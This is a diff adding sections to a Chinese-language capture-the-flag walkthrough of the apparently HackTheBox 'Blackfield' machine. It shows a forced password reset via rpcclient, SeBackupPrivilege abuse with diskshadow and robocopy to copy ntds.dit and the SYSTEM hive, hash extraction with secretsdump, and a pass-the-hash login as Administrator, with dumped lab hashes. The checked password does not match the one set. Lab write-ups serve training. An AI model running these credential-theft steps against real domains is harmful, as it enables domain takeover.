@@ -11,6 +11,9 @@ tags:
   - WriteDacl
   - PrintSpoofer
   - JuciePotato
+  - Windows
+  - ForceChangePassword
+  - SeBackupPrivilege
 is_long: true
 ---
 ## 枚举
@@ -575,4 +578,240 @@ Add-DomainObjectAcl -TargetIdentity 'Backup_Admins' -PrincipalIdentity claire -R
 
 ```PowerShell
 Add-DomainGroupMember -Identity "Backup_Admins" -Members claire
+```
+
+### ForceChangePassword
+
+使用 rpcclient 连接 support，使用 setuserinfo2 修改 audit2020 的密码为 `123456`
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ rpcclient -U 'BLACKFIELD/support%#00^BlackKnight' 10.129.229.17
+rpcclient $> setuserinfo2 audit2020 23 '123456'
+```
+
+验证是否修改成功。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ nxc smb 10.129.229.17 -u audit2020 -p 'P@ssword'
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2
+```
+
+### SeBackupPrivilege
+
+SeBackupPrivilege 是 Windows 的备份文件和目录特权，启用时可以绕过 NTFS ACL 文件权限检查，读取本来无权读取的敏感文件。
+
+```bash
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+```
+
+在 Kali 中制作提权脚本。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ printf 'set context persistent nowriters\r\nadd volume c: alias cdrive\r\ncreate\r\nexpose %%cdrive%% z:\r\n' > dshadow.txt                                                                                
+                                                                                                        
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ xxd dshadow.txt 
+00000000: 7365 7420 636f 6e74 6578 7420 7065 7273  set context pers
+00000010: 6973 7465 6e74 206e 6f77 7269 7465 7273  istent nowriters
+00000020: 0d0a 6164 6420 766f 6c75 6d65 2063 3a20  ..add volume c: 
+00000030: 616c 6961 7320 6364 7269 7665 0d0a 6372  alias cdrive..cr
+00000040: 6561 7465 0d0a 6578 706f 7365 2025 6364  eate..expose %cd
+00000050: 7269 7665 2520 7a3a 0d0a                 rive% z:..
+```
+
+解释一下这个脚本：
+
+```dshadow.txt
+set context persistent nowriters
+add volume c: alias cdrive
+create
+expose %cdrive% z:
+```
+
+- `persistent`：让创建的卷影副本在 diskshadow 退出后仍然存在
+- `nowriters`：不通知 VSS Writers 去协调程序写入，因此创建的更快，但一致性保障较弱
+- `add volume c: alias cdrive`：指定 C 盘创建卷影副本，别名为 cdrive
+- `expose %cdrive% z:`：创建 C盘 快照，挂载为` z:` 盘
+
+上传至目标机器，并验证完整性。
+
+挂载。
+
+```bash
+*Evil-WinRM* PS C:\programdata\apps> upload dshadow.txt
+                                        
+Info: Uploading /home/kali/Work/Kali/Blackfield/dshadow.txt to C:\programdata\apps\dshadow.txt
+                                        
+Data: 120 bytes of 120 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\programdata\apps> Get-Content C:\Users\svc_backup\Desktop\dshadow.txt
+set context persistent nowriters
+add volume c: alias cdrive
+create
+expose %cdrive% z:
+*Evil-WinRM* PS C:\programdata\apps> Format-Hex C:\Users\svc_backup\Desktop\dshadow.txt
+
+
+           Path: C:\Users\svc_backup\Desktop\dshadow.txt
+
+           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000   73 65 74 20 63 6F 6E 74 65 78 74 20 70 65 72 73  set context pers
+00000010   69 73 74 65 6E 74 20 6E 6F 77 72 69 74 65 72 73  istent nowriters
+00000020   0A 61 64 64 20 76 6F 6C 75 6D 65 20 63 3A 20 61  .add volume c: a
+00000030   6C 69 61 73 20 63 64 72 69 76 65 0A 63 72 65 61  lias cdrive.crea
+00000040   74 65 0A 65 78 70 6F 73 65 20 25 63 64 72 69 76  te.expose %cdriv
+00000050   65 25 20 7A 3A 0D 0A                             e% z:..
+```
+
+验证挂载并复制 `ntds.dit` 与 `SYSTEM`。
+
+```bash
+*Evil-WinRM* PS C:\programdata\apps> ls Z:\Windows\NTDS
+ 
+
+
+    Directory: Z:\Windows\NTDS
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/10/2023   6:29 PM           8192 edb.chk
+-a----        4/27/2026  11:02 AM       10485760 edb.log
+-a----        2/23/2020   9:41 AM       10485760 edb00004.log
+-a----        2/23/2020   9:41 AM       10485760 edb00005.log
+-a----        2/23/2020   3:13 AM       10485760 edbres00001.jrs
+-a----        2/23/2020   3:13 AM       10485760 edbres00002.jrs
+-a----        2/23/2020   9:41 AM       10485760 edbtmp.log
+-a----        4/27/2026  10:31 AM       18874368 ntds.dit
+-a----        4/27/2026  10:31 AM          16384 ntds.jfm
+-a----        4/27/2026  10:31 AM         434176 temp.edb
+
+
+*Evil-WinRM* PS C:\programdata\apps> mkdir ntds
+
+
+    Directory: C:\programdata\apps
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        4/27/2026  11:10 AM                ntds
+
+
+*Evil-WinRM* PS C:\programdata\apps> robocopy /b Z:\Windows\NTDS C:\programdata\apps\ntds ntds.dit
+
+...
+
+*Evil-WinRM* PS C:\programdata\apps> reg save HKLM\SYSTEM C:\programdata\apps\ntds\SYSTEM
+The operation completed successfully.
+
+*Evil-WinRM* PS C:\programdata\apps> dir ntds
+
+
+    Directory: C:\programdata\apps\ntds
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----        4/27/2026  10:31 AM       18874368 ntds.dit
+-a----        4/27/2026  11:11 AM       17383424 SYSTEM
+```
+
+下载至 kali。
+
+```bash
+*Evil-WinRM* PS C:\programdata\apps\ntds> download ntds.dit
+                                        
+Info: Downloading C:\programdata\apps\ntds\ntds.dit to ntds.dit
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\programdata\apps\ntds> download SYSTEM
+                                        
+Info: Downloading C:\programdata\apps\ntds\SYSTEM to SYSTEM
+                                        
+Info: Download successful!
+```
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ ls -liah SYSTEM     
+2781608 -rw-rw-r-- 1 kali kali 17M Apr 27 07:24 SYSTEM
+                                                                                                                              
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ ls -liha ntds.dit
+2792050 -rw-rw-r-- 1 kali kali 18M Apr 27 07:19 ntds.dit
+```
+
+使用 secretsdump 爆破 hash。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | tee HASH.txt
+...
+...
+
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ head -n 10 HASH.txt 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x73d83e56de8961ca9f243e1a49638393
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 35640a3fd5111b93cc50e3b4e255ff8c
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
+```
+
+使用 hash 登录 Administrator 得到 root flag。
+
+```bash
+┌──(kali㉿kali)-[~/Work/Kali/Blackfield]
+└─$ evil-winrm -i 10.129.25.101 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
+4375a629c7c67c8e29db269060c955cb
 ```
